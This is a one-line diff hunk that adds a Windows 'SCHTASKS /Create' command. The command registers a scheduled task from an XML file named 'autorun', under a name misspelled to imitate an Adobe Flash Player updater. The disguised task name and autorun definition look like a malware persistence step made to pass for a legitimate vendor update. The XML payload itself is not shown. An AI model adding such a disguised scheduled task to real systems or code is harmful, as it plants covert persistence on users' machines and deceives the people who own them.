@@ -1,0 +1,1 @@
+SCHTASKS /Create /tn AdobeFlashPlayerUpdateer /XML autorun
